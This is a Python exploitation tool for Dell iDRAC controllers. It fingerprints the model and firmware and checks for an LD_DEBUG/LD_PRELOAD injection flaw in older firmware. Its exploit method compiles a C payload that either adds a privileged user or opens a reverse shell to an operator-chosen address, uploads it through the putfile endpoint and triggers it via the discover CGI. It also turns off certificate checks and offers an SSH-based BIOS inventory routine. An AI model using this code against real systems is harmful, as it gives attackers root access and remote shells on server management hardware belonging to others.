import httpx
import warnings
import json
import os
import re
import struct
import ssl
import uuid
import asyncio
import shutil
from typing import Dict, Optional, Union, List
import socket
import random
import string
import secrets
import paramiko
import time

# Disable SSL warnings for httpx
warnings.filterwarnings('ignore')

# SSL context configuration
ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE
ssl_context.set_ciphers('ALL:@SECLEVEL=0')
ssl_context.minimum_version = ssl.TLSVersion.TLSv1

class iDRAC:
    def __init__(self, ip: str, port: int = 443):
        self.ip = ip
        self.port = port
        self.username = None
        self.password = None
        self.base_url = f"https://{ip}:{port}"
        self.payloadScripts = os.path.join(os.path.dirname(__file__), "payloads")
        self.client = None  # Initialize as None
    
    async def __aenter__(self):
        """Async context manager entry"""
        await self._ensure_client()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        if self.client:
            await self.client.aclose()
    
    async def _ensure_client(self):
        """Ensure httpx client is initialized"""
        if not self.client:
            self.client = httpx.AsyncClient(
                verify=ssl_context,
                timeout=30.0,
            )

    async def _fetchURL(self, endpoint: str, data: Union[bytes, Dict] = None):
        await self._ensure_client()
        
        if data:
            return await self.client.post(url=f"{self.base_url}{endpoint}", data=data)
        else:
            return await self.client.get(url=f"{self.base_url}{endpoint}")
    
    async def getInfo(self):
        result = {
            "ip": self.ip,
            "port": self.port,
            "hostname": None,
            "systemModel": None,
            "idracModel": None,
            "license": None,
            "fwVersion": None,
            "error": None,
            "success": True
        }

        rLogin = await self._fetchURL("/login.html")
        if rLogin and rLogin.status_code == 200:
            if 'idrac6' in rLogin.text.lower() and 'idrac7' not in rLogin.text.lower():
                result['idracModel'] = 'iDRAC6'
                for line in rLogin.text.split('\n'):
                    if 'var tmphostname' in line.lower():
                        result['hostname'] = line.split('"')[1].strip()
                    elif 'integrated dell remote access controller 6' in line.lower():
                        result['license'] = line.split('- ')[1].split('<')[0]
                return result
        elif rLogin is None:
            result['success'] = False
            result['error'] = 'Timeout connecting to iDRAC'
            return result

        rDataPServerGen = await self._fetchURL("/data?get=prodServerGen")
        if rDataPServerGen and rDataPServerGen.status_code == 200:
            if '12g' in rDataPServerGen.text.lower():
                result['idracModel'] = 'iDRAC7'
            else:
                result['idracModel'] = 'iDRAC8'

            rDataClassName = await self._fetchURL("/data?get=prodClassName")
            if rDataClassName and rDataClassName.status_code == 200:
                try:
                    result['license'] = rDataClassName.text.split('<prodClassName>')[1].split('</prodClassName>')[0]
                except:
                    pass

            rSession = await self._fetchURL("/session?aimGetProp=hostname,gui_str_title_bar,OEMHostName,fwVersion,sysDesc")
            if rSession and rSession.status_code == 200:
                try:
                    data = json.loads(rSession.text)['aimGetProp']
                    result['hostname'] = data.get('hostname', 'Unknown')
                    result['fwVersion'] = data.get('fwVersion', 'Unknown')
                    result['systemModel'] = data.get('sysDesc', 'Unknown')
                except:
                    pass
            return result
        elif rDataPServerGen is None:
            result['success'] = False
            result['error'] = 'Timeout connecting to iDRAC'
            return result

        rLocale = await self._fetchURL("/restgui/locale/strings/locale_str_en.json")
        if rLocale and rLocale.status_code == 200:
            try:
                data = json.loads(rLocale.text)
                if data.get('app_title') == 'iDRAC9':
                    result['idracModel'] = 'iDRAC9'
            except:
                pass
        elif rLocale is None:
            result['success'] = False
            result['error'] = 'Timeout connecting to iDRAC'
            return result

        return result
    
    async def checkIfVulnerable(self):
        result = {
            "vulnerable": False,
            "error": None,
            "success": True
        }

        fwVulnerable = False
        ldDebugVulnerable = False

        # Firmware check
        try:
            rSession = await self._fetchURL("/session?aimGetProp=fwVersion")
            if rSession and rSession.status_code == 200:
                fwVersion = json.loads(rSession.text)['aimGetProp'].get('fwVersion', '')

                parts = fwVersion.split('.')
                if len(parts) >= 2:
                    major = int(parts[0])
                    minor = int(parts[1])
                    fwVulnerable = (major < 2) or (major == 2 and minor < 52)
        except Exception as e:
            result["success"] = False
            result["error"] = str(e)
            return result
        
        if fwVulnerable:
            try:
                rLDDebug = await self._fetchURL("/cgi-bin/login?LD_DEBUG=files")

                if rLDDebug and rLDDebug.text:
                    ldDebugVulnerable = r"calling init: /lib/" in rLDDebug.text
                    
            except Exception as e:
                result["success"] = False
                result["error"] = str(e)
                return result
        
        result["vulnerable"] = fwVulnerable and ldDebugVulnerable
        return result

    async def exploit(self, 
                     payload_type: str = "adduser", 
                     username: str = "root", 
                     password: str = "calvin", 
                     privilege: str = "0x000001ff",
                     reverse_ip: str = None,
                     reverse_port: int = None):
        """
        Execute exploit with selected payload
        
        Args:
            payload_type: Type of payload to use ("adduser", "reverseshell" or "quickpayload")
            username: Username for adduser payload
            password: Password for adduser payload
            privilege: Privilege level for adduser payload
            reverse_ip: IP for reverse shell callback
            reverse_port: Port for reverse shell callback
        """
        
        result = {
            "payload_type": payload_type,
            "credentials": {
                "username": username,
                "password": password,
            },
            "reverse_shell": {
                "ip": reverse_ip,
                "port": reverse_port
            },
            "privilege": privilege,
            "success": True,
            "error": None
        }

        # Validate payload type
        availableTypes = [
            os.path.splitext(f)[0]
            for f in os.listdir(self.payloadScripts)
            if f.endswith(".c") and os.path.isfile(os.path.join(self.payloadScripts, f))
        ]
        if payload_type not in availableTypes:
            result["success"] = False
            result["error"] = f"Invalid payload type. Available types: {availableTypes}"
            return result

        workFolder = f"work_{str(uuid.uuid4())[:8]}"
        os.makedirs(workFolder, exist_ok=True)

        try:
            # Load and prepare the payload
            CPayloadFile = os.path.join(self.payloadScripts, f"{payload_type}.c")
            
            
            if not os.path.exists(CPayloadFile):
                result["success"] = False
                result["error"] = f"Payload file not found: {CPayloadFile}"
                return result

            with open(CPayloadFile, "r", encoding="utf-8") as f:
                CPayload = f.read()

            # Replace variables based on payload type
            if payload_type in ("adduser", "adduser_enterprise", "quickpayload"):
                CPayload = CPayload.replace("{username}", username)
                CPayload = CPayload.replace("{password}", password)
                CPayload = CPayload.replace("{privilege}", privilege)
            elif payload_type in ("reverseshell"):
                CPayload = CPayload.replace("{ip}", reverse_ip)
                CPayload = CPayload.replace("{port}", str(reverse_port))

            # Save payload to work folder
            payload_c_path = os.path.join(workFolder, "payload.c")
            with open(payload_c_path, "w", encoding="utf-8") as f:
                f.write(CPayload)

            # Compile payload
            print(f"Compiling {payload_type} payload...")
            compileStatus = os.system(
                f'sh4-linux-gnu-gcc -shared -fPIC {payload_c_path} -o {os.path.join(workFolder, "payload.so")}'
            )
            if compileStatus != 0:
                result["error"] = "Compilation failed (SH4 cross-compiler required)"
                result["success"] = False
                print("Compilation failed")
                return result
            print("Compilation successful")
            
            # Read compiled payload
            print("Uploading payload...")
            with open(os.path.join(workFolder, "payload.so"), 'rb') as f:
                payload_so = f.read()

            # Prepare upload data
            FFLAGS = 1
            FAlias = b'RACPKSSHAUTHKEY1'
            payload = FAlias + (32 - len(FAlias))*b'\0'
            payload += struct.pack('<L', len(payload_so))
            payload += struct.pack('<L', FFLAGS)
            payload += payload_so

            # Upload payload
            rUpload = await self._fetchURL("/cgi-bin/putfile", data=payload)
            if rUpload and rUpload.status_code == 200:
                print("Payload uploaded successfully")
            else:
                print("Payload upload failed")
                result["error"] = "Error uploading payload, maybe a timeout issue."
                result["success"] = False
                return result
            
            # Trigger payload
            print("Triggering payload...")
            rTrigger = await self._fetchURL("/cgi-bin/discover?LD_PRELOAD=/tmp/sshpkauthupload.tmp")
            if rTrigger and rTrigger.status_code == 200:
                print("Payload triggered successfully")
                
                # Add success messages based on payload type
                if payload_type == "adduser":
                    print(f"✓ User added successfully")
                    print(f"  Username: {username}")
                    print(f"  Password: {password}")
                elif payload_type == "reverseshell":
                    print(f"✓ Reverse shell payload executed")
                    print(f"  Connecting to {reverse_ip}:{reverse_port}")
                    print("  Make sure you have a listener ready!")
                    
            else:
                print("Payload trigger failed")
                result["error"] = "Error triggering the payload, maybe a timeout issue."
                result["success"] = False
                return result
            
            return result
            
        except Exception as e:
            result["success"] = False
            result["error"] = str(e)
            print(f"Error during exploit: {e}")
            return result
            
        finally:
            # Clean up work folder
            if os.path.exists(workFolder):
                try:
                    shutil.rmtree(workFolder)
                    print(f"Cleaned up work folder: {workFolder}")
                except Exception as e:
                    print(f"Warning: Could not clean up work folder {workFolder}: {e}")
    
    async def getInventory(self, username=None, password=None) -> Dict:
        """
        Get BIOS inventory by SSHing into the iDRAC, executing racadm commands,
        waiting for completion, and returning raw logs.
        """

        username = self.username if username is None else username
        password = self.password if password is None else password
        
        commands = [
            "racadm get BIOS.SysInformation",
            "racadm get BIOS.ProcSettings", 
            "racadm get BIOS.MemSettings",
            "racadm get BIOS.SysProfileSettings",
            "racadm get BIOS.IntegratedDevices",
            "racadm get BIOS.SlotDisablement",
            "racadm get BIOS.SlotBifurcation",
            "racadm get BIOS.SataSettings",
            "racadm get BIOS.SysSecurity",
            "racadm get BIOS.TpmAdvanced",
            "racadm get BIOS.MiscSettings"
        ]
        
        result = {
            "success": False,
            "error": None,
            "raw_logs": ""
        }
        
        client = None
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            print(f"SSH connecting to {self.ip}...")
            client.connect(
                hostname=self.ip,
                port=22,
                username=username,
                password=password,
                timeout=30,
                allow_agent=False,
                look_for_keys=False
            )
            
            # Get shell channel
            shell = client.invoke_shell()
            time.sleep(3)
            
            # Clear any initial output
            while shell.recv_ready():
                shell.recv(1024)
            
            # Execute all commands
            all_output = ""
            for cmd in commands:
                print(f"Executing: {cmd}")
                shell.send(f"{cmd}\n")
                time.sleep(0.25)
            
            # Wait for all commands to finish
            print("Waiting for commands to complete...")
            last_data_time = time.time()
            idle_timeout = 10 # seconds
            
            while True:
                if shell.recv_ready():
                    output = shell.recv(4096).decode('utf-8', errors='ignore')
                    all_output += output
                    last_data_time = time.time()
                    print(f"Received {len(output)} bytes")
                elif shell.exit_status_ready():
                    break
                
                # Check if idle for too long
                if time.time() - last_data_time > idle_timeout:
                    print(f"No data for {idle_timeout} seconds, assuming completion")
                    break
                
                time.sleep(0.5)
            
            # Get any remaining output
            while shell.recv_ready():
                output = shell.recv(4096).decode('utf-8', errors='ignore')
                all_output += output
            
            result["raw_logs"] = all_output
            result["success"] = True
            
        except Exception as e:
            result["error"] = f"SSH error: {str(e)}"
            print(f"Error: {str(e)}")
        finally:
            if client:
                client.close()
                print("SSH connection closed")
        
        return result